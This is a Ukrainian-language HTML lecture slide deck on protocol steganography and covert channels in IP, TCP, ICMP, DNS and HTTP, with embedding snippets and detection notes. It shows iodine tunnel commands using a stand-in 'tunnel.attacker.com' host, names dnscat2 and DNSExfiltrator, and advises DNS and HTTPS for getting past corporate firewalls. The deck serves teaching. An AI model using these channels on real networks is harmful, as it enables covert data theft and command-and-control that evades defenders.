@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Протокольні методи | Лекція 11.2</title>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../../../new_assets/presentation/css/styles.css">
+
+</head>
+<body>
+
+<div class="presentation">
+
+    <!-- Слайд 1: Титульний -->
+    <div class="slide active title-slide">
+        <h1>📡 Протокольні методи</h1>
+        <div class="subtitle">
+            Тема 2: TCP/IP, DNS, HTTP та ICMP стеганографія
+        </div>
+    </div>
+
+    <!-- Слайд 2: Огляд методів -->
+    <div class="slide">
+        <h2>🗺️ Карта протокольних методів</h2>
+
+        <div class="info-box">
+            <strong>💡 Принцип:</strong> Кожен мережевий протокол має поля, які можна модифікувати для приховування даних без порушення функціональності.
+        </div>
+
+        <h3>Основні протоколи для стеганографії:</h3>
+        <ul>
+            <li><strong>IP</strong> — базовий рівень, ID, TTL, DSCP поля</li>
+            <li><strong>TCP</strong> — sequence numbers, timestamps, options</li>
+            <li><strong>UDP</strong> — простіший, checksum, payload</li>
+            <li><strong>ICMP</strong> — ping, payload даних</li>
+            <li><strong>DNS</strong> — domain names, TXT records</li>
+            <li><strong>HTTP</strong> — headers, cookies, URL parameters</li>
+        </ul>
+
+        <div class="success-box">
+            <strong>Стратегія:</strong> Вибір протоколу залежить від потрібної ємності, непомітності та можливості проходження через файрволи.
+        </div>
+    </div>
+
+    <!-- Слайд 3: IP Identification -->
+    <div class="slide">
+        <h2>🔢 IP Identification Field</h2>
+
+        <div class="info-box">
+            <strong>Поле:</strong> 16-бітний ідентифікатор пакета, використовується для збирання фрагментів.
+        </div>
+
+        <h3>Метод вбудовування:</h3>
+        <div class="code-block">// Відправник
+packet.ip_id = secret_data[i] << 8 | secret_data[i+1];
+
+// Отримувач
+data[i] = packet.ip_id >> 8;
+data[i+1] = packet.ip_id & 0xFF;</div>
+
+        <h3>Характеристики:</h3>
+        <ul>
+            <li><strong>Ємність:</strong> 16 біт (2 байти) на пакет</li>
+            <li><strong>Непомітність:</strong> середня — деякі ОС використовують послідовні ID</li>
+            <li><strong>Стійкість:</strong> висока — NAT зазвичай зберігає ID</li>
+        </ul>
+
+        <div class="warning-box">
+            <strong>⚠️ Виявлення:</strong> Статистичний аналіз може виявити неприродний розподіл значень ID.
+        </div>
+    </div>
+
+    <!-- Слайд 4: TCP ISN -->
+    <div class="slide">
+        <h2>🔗 TCP Initial Sequence Number (ISN)</h2>
+
+        <div class="info-box">
+            <strong>Поле:</strong> 32-бітний початковий номер послідовності при встановленні TCP з'єднання.
+        </div>
+
+        <h3>Метод Covert_TCP:</h3>
+        <div class="code-block">// SYN пакет з прихованими даними
+tcp_header.seq = encode_data(secret_message, 4); // 4 байти
+
+// Отримувач читає ISN з SYN-ACK
+hidden_data = decode_data(received_syn.seq);</div>
+
+        <h3>Переваги:</h3>
+        <ul class="checklist">
+            <li>Висока ємність: 32 біти на з'єднання</li>
+            <li>Сучасні ОС генерують випадкові ISN — важко виявити</li>
+            <li>Проходить через більшість файрволів</li>
+        </ul>
+
+        <div class="warning-box">
+            <strong>Обмеження:</strong> Потрібне нове TCP з'єднання для кожних 4 байт даних — повільно та помітно при великих обсягах.
+        </div>
+    </div>
+
+    <!-- Слайд 5: TCP Timestamps -->
+    <div class="slide">
+        <h2>⏰ TCP Timestamps Option</h2>
+
+        <div class="info-box">
+            <strong>Поле:</strong> 32-бітні timestamps в TCP options для RTT вимірювання.
+        </div>
+
+        <h3>Структура TCP Timestamp Option:</h3>
+        <div class="code-block">+-------+-------+---------------------+---------------------+
+| Kind  | Len   |   TS Value (TSval)  |  TS Echo Reply      |
+|  8    |  10   |      32 bits        |     32 bits         |
++-------+-------+---------------------+---------------------+</div>
+
+        <h3>Метод модуляції LSB:</h3>
+        <div class="code-block">// Вбудовування в молодші біти
+tsval = (current_time & 0xFFFFFFF0) | (secret_nibble & 0x0F);
+
+// Ємність: 4 біти на пакет</div>
+
+        <h3>Характеристики:</h3>
+        <ul>
+            <li><strong>Непомітність:</strong> висока — timestamps природно варіюються</li>
+            <li><strong>Ємність:</strong> 4-8 біт на пакет (LSB модуляція)</li>
+            <li><strong>Стійкість:</strong> середня — деякі middlebox модифікують</li>
+        </ul>
+    </div>
+
+    <!-- Слайд 6: ICMP Tunneling -->
+    <div class="slide">
+        <h2>🏓 ICMP Tunneling (Loki)</h2>
+
+        <div class="info-box">
+            <strong>Ідея:</strong> Використання payload ICMP Echo Request/Reply для передачі довільних даних.
+        </div>
+
+        <h3>Структура ICMP Echo:</h3>
+        <div class="code-block">+-------+-------+------------------+
+| Type  | Code  |     Checksum     |
++-------+-------+------------------+
+|    Identifier |   Seq Number     |
++---------------+------------------+
+|          Data (Payload)          |
+|            ...                   |
++----------------------------------+</div>
+
+        <h3>Переваги:</h3>
+        <ul class="checklist">
+            <li>Великий payload — до 64 КБ даних</li>
+            <li>Ping часто дозволений через файрволи</li>
+            <li>Простота реалізації</li>
+        </ul>
+
+        <div class="warning-box">
+            <strong>⚠️ Виявлення:</strong> Легко детектується за розміром payload та частотою ping запитів. Багато IDS мають правила для ICMP tunneling.
+        </div>
+    </div>
+
+    <!-- Слайд 7: DNS Tunneling - Основи -->
+    <div class="slide">
+        <h2>🌍 DNS Tunneling — Основи</h2>
+
+        <div class="info-box">
+            <strong>💡 Ідея:</strong> Кодування даних у DNS запитах та відповідях. DNS майже завжди дозволений через файрволи!
+        </div>
+
+        <h3>Чому DNS?</h3>
+        <ul>
+            <li>DNS (порт 53) рідко блокується</li>
+            <li>Працює навіть в captive portals</li>
+            <li>Ієрархічна структура дозволяє relay через авторитетні сервери</li>
+            <li>Підтримує різні типи записів (A, TXT, CNAME, MX)</li>
+        </ul>
+
+        <h3>Базова схема:</h3>
+        <div class="code-block">Клієнт → DNS Query: encoded-data.attacker-domain.com
+                    ↓
+        Рекурсивний DNS сервер
+                    ↓
+Авторитетний сервер attacker-domain.com ← Декодує запит
+                    ↓
+        DNS Response з прихованими даними</div>
+    </div>
+
+    <!-- Слайд 8: DNS Tunneling - Кодування -->
+    <div class="slide">
+        <h2>🔤 DNS Tunneling — Методи кодування</h2>
+
+        <h3>1. Subdomain Encoding (запити)</h3>
+        <div class="code-block">// Base32/Base64 кодування даних у subdomain
+"SGVsbG8gV29ybGQ.tunnel.attacker.com"
+// Декодується як "Hello World"
+
+// Обмеження:
+// - Мітка до 63 символів
+// - Загальна довжина до 253 символів
+// - ~150 байт корисних даних на запит</div>
+
+        <h3>2. TXT Records (відповіді)</h3>
+        <div class="code-block">// Сервер повертає дані в TXT записі
+TXT "U2VjcmV0IGRhdGEgZnJvbSBzZXJ2ZXI="
+
+// До 255 символів на TXT запис
+// Можна кілька TXT записів у відповіді</div>
+
+        <h3>3. Типи записів:</h3>
+        <ul>
+            <li><strong>A/AAAA:</strong> 4/16 байт на відповідь</li>
+            <li><strong>TXT:</strong> до 255 байт</li>
+            <li><strong>NULL:</strong> довільні дані (рідко підтримується)</li>
+            <li><strong>CNAME:</strong> ~200 байт</li>
+        </ul>
+    </div>
+
+    <!-- Слайд 9: DNS Tunneling Tools -->
+    <div class="slide">
+        <h2>🛠️ Інструменти DNS Tunneling</h2>
+
+        <table>
+            <tr>
+                <th>Інструмент</th>
+                <th>Опис</th>
+                <th>Особливості</th>
+            </tr>
+            <tr>
+                <td><strong>iodine</strong></td>
+                <td>IPv4 через DNS</td>
+                <td>Повний IP тунель, до 1 Mbit/s</td>
+            </tr>
+            <tr>
+                <td><strong>dnscat2</strong></td>
+                <td>C&C через DNS</td>
+                <td>Шифрування, shell доступ</td>
+            </tr>
+            <tr>
+                <td><strong>dns2tcp</strong></td>
+                <td>TCP через DNS</td>
+                <td>Простий, надійний</td>
+            </tr>
+            <tr>
+                <td><strong>DNSExfiltrator</strong></td>
+                <td>Ексфільтрація даних</td>
+                <td>AES шифрування</td>
+            </tr>
+        </table>
+
+        <h3>Приклад iodine:</h3>
+        <div class="code-block"># Сервер (на авторитетному DNS)
+iodined -f 10.0.0.1 tunnel.attacker.com
+
+# Клієнт
+iodine -f tunnel.attacker.com
+
+# Результат: tun0 інтерфейс з IP тунелем через DNS</div>
+    </div>
+
+    <!-- Слайд 10: HTTP Steganography -->
+    <div class="slide">
+        <h2>🌐 HTTP Стеганографія</h2>
+
+        <div class="info-box">
+            <strong>Переваги:</strong> HTTP/HTTPS трафік домінує в мережах, ідеально маскується під легітимну активність.
+        </div>
+
+        <h3>Методи вбудовування:</h3>
+
+        <h4>1. Custom Headers</h4>
+        <div class="code-block">GET / HTTP/1.1
+Host: example.com
+X-Request-ID: SGVsbG8gV29ybGQ=    // Base64 дані
+X-Correlation-ID: c2VjcmV0        // Виглядає легітимно</div>
+
+        <h4>2. Cookies</h4>
+        <div class="code-block">Cookie: session=abc123; tracking=ZGF0YQ==</div>
+
+        <h4>3. URL Parameters</h4>
+        <div class="code-block">GET /search?q=normal&ref=SGVsbG8= HTTP/1.1</div>
+
+        <h4>4. Response Body</h4>
+        <ul>
+            <li>HTML коментарі: <code>&lt;!-- hidden data --&gt;</code></li>
+            <li>Whitespace кодування</li>
+            <li>Стеганографія в зображеннях</li>
+        </ul>
+    </div>
+
+    <!-- Слайд 11: HTTP Advanced Methods -->
+    <div class="slide">
+        <h2>🔧 HTTP — Просунуті методи</h2>
+
+        <h3>1. Chunked Transfer Encoding</h3>
+        <div class="code-block">Transfer-Encoding: chunked
+
+5\r\n          // Chunk size (можна кодувати дані)
+Hello\r\n
+6\r\n
+World!\r\n
+0\r\n          // Кінець</div>
+
+        <h3>2. HTTP/2 Specific</h3>
+        <ul>
+            <li>HPACK header compression manipulation</li>
+            <li>Stream priorities encoding</li>
+            <li>PING frames payload</li>
+        </ul>
+
+        <h3>3. WebSocket</h3>
+        <div class="code-block">// Маскування під легітимний WebSocket трафік
+ws.send(JSON.stringify({
+    type: "heartbeat",
+    data: "SGVsbG8="  // Приховані дані
+}));</div>
+
+        <div class="success-box">
+            <strong>Перевага HTTPS:</strong> Шифрування TLS приховує вміст від DPI, залишається лише аналіз метаданих.
+        </div>
+    </div>
+
+    <!-- Слайд 12: Комбіновані методи -->
+    <div class="slide">
+        <h2>🔀 Комбіновані та гібридні методи</h2>
+
+        <h3>1. Protocol Switching</h3>
+        <p>Чергування протоколів для ускладнення виявлення:</p>
+        <ul>
+            <li>DNS для C&C команд</li>
+            <li>HTTP для ексфільтрації даних</li>
+            <li>ICMP для keepalive</li>
+        </ul>
+
+        <h3>2. Redundancy</h3>
+        <p>Дублювання даних у різних полях для надійності:</p>
+        <div class="code-block">// Один і той же біт у:
+// - IP ID (біт 0)
+// - TCP timestamp LSB (біт 0)
+// Отримувач використовує majority voting</div>
+
+        <h3>3. Adaptive Methods</h3>
+        <p>Динамічне переключення методів залежно від умов мережі та виявлення спроб детекції.</p>
+
+        <div class="info-box">
+            <strong>Тренд:</strong> Сучасні APT використовують Domain Fronting — маскування C&C трафіку під відомі CDN (Cloudflare, Azure).
+        </div>
+    </div>
+
+    <!-- Слайд 13: Порівняння протоколів -->
+    <div class="slide">
+        <h2>📊 Порівняння протокольних методів</h2>
+
+        <table>
+            <tr>
+                <th>Протокол</th>
+                <th>Ємність</th>
+                <th>Непомітність</th>
+                <th>Firewall</th>
+            </tr>
+            <tr>
+                <td>IP ID</td>
+                <td>16 біт/пакет</td>
+                <td>Середня</td>
+                <td>✅ Проходить</td>
+            </tr>
+            <tr>
+                <td>TCP ISN</td>
+                <td>32 біт/з'єдн</td>
+                <td>Висока</td>
+                <td>✅ Проходить</td>
+            </tr>
+            <tr>
+                <td>ICMP</td>
+                <td>~1 КБ/пакет</td>
+                <td>Низька</td>
+                <td>⚠️ Часто блок.</td>
+            </tr>
+            <tr>
+                <td>DNS</td>
+                <td>~200 Б/запит</td>
+                <td>Середня</td>
+                <td><span class="highlight">✅ Завжди</span></td>
+            </tr>
+            <tr>
+                <td>HTTP/S</td>
+                <td>Висока</td>
+                <td>Дуже висока</td>
+                <td><span class="highlight">✅ Завжди</span></td>
+            </tr>
+        </table>
+
+        <div class="success-box">
+            <strong>Рекомендація:</strong> DNS та HTTPS — найкращий вибір для проходження корпоративних файрволів.
+        </div>
+    </div>
+
+    <!-- Слайд 14: Висновки -->
+    <div class="slide">
+        <h2>📌 Висновки</h2>
+
+        <h3>Ключові ідеї:</h3>
+        <ul class="checklist">
+            <li>IP ID та TCP ISN — класичні методи header manipulation</li>
+            <li>ICMP tunneling — високa ємність, але легко детектується</li>
+            <li>DNS tunneling — проходить майже всі файрволи</li>
+            <li>HTTP/HTTPS — найкраще маскування під легітимний трафік</li>
+            <li>Комбіновані методи підвищують надійність та непомітність</li>
+        </ul>
+
+        <div class="info-box">
+            <strong>Наступна тема:</strong> Часові канали — модуляція затримок пакетів для приховування інформації.
+        </div>
+
+        <div style="text-align: center; margin-top: 2rem;">
+            <a href="tema1_network_basics.html" class="btn btn-primary" style="margin: 0 0.5rem;">
+                ← Основи мережевої стеганографії
+            </a>
+            <a href="tema3_timing_channels.html" class="btn btn-primary" style="margin: 0 0.5rem;">
+                Далі: Часові канали →
+            </a>
+        </div>
+    </div>
+
+</div>
+
+<!-- Navigation -->
+<div class="navigation">
+    <button id="prev-slide" class="nav-btn" onclick="previousSlide()">← Попередній</button>
+    <button id="home-btn" class="nav-btn" onclick="window.location.href='index.html'">🏠 Головна</button>
+    <button id="next-slide" class="nav-btn" onclick="nextSlide()">Наступний →</button>
+</div>
+
+<!-- Slide Counter -->
+<div class="slide-counter">1 / 14</div>
+
+<script>
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    const totalSlides = slides.length;
+
+    function showSlide(n) {
+        slides.forEach(slide => slide.classList.remove('active'));
+
+        if (n >= totalSlides) currentSlide = 0;
+        if (n < 0) currentSlide = totalSlides - 1;
+
+        slides[currentSlide].classList.add('active');
+
+        document.querySelector('.slide-counter').textContent = `${currentSlide + 1} / ${totalSlides}`;
+
+        document.getElementById('prev-slide').disabled = currentSlide === 0;
+        document.getElementById('next-slide').disabled = currentSlide === totalSlides - 1;
+    }
+
+    function nextSlide() {
+        if (currentSlide < totalSlides - 1) {
+            currentSlide++;
+            showSlide(currentSlide);
+        }
+    }
+
+    function previousSlide() {
+        if (currentSlide > 0) {
+            currentSlide--;
+            showSlide(currentSlide);
+        }
+    }
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowRight') nextSlide();
+        if (e.key === 'ArrowLeft') previousSlide();
+        if (e.key === 'Escape') window.location.href = 'index.html';
+    });
+
+    showSlide(0);
+
+    // Auto-detect and add scroll indicators to slides with scrollable content
+    function addScrollIndicators() {
+        slides.forEach(slide => {
+            // Check if slide content exceeds viewport height
+            const isScrollable = slide.scrollHeight > slide.clientHeight;
+
+            if (isScrollable) {
+                // Check if indicator already exists
+                if (!slide.querySelector('.scroll-indicator')) {
+                    const indicator = document.createElement('div');
+                    indicator.className = 'scroll-indicator visible';
+                    indicator.innerHTML = '<div class="dot"></div><div class="dot"></div><div class="dot"></div>';
+                    slide.appendChild(indicator);
+                }
+            }
+        });
+    }
+
+    // Run on load and resize
+    addScrollIndicators();
+    window.addEventListener('resize', addScrollIndicators);
+</script>
+
+</body>
+</html>
